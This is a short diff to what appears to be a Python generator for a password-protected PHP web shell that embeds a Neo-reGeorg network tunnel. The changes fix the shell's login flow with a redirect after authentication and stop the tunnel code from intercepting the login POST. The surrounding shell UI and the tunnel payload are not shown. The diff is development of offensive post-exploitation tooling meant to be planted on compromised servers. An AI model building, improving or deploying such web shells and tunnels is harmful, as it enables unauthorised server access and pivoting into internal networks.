@@ -96,6 +96,8 @@ session_start();
 if (isset($_POST['__auth_pass'])) {{
     if (hash_equals($__AUTH_HASH, hash('sha256', $_POST['__auth_pass']))) {{
         $_SESSION['__authed'] = true;
+        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
+        exit;
     }}
 }}
 if (isset($_GET['logout'])) {{
@@ -243,7 +245,7 @@ def build(args):
         # GET hello check is not intercepted — neoreg client auto-detects body offsets
         tunnel_block = (
             "// Neo-reGeorg tunnel — intercept raw POST before shell UI\n"
-            "if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action'])) {\n"
+            "if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action']) && !isset($_POST['__auth_pass'])) {\n"
             "ob_end_clean();\n"
             + neoreg_code + "\n"
             "exit;\n"
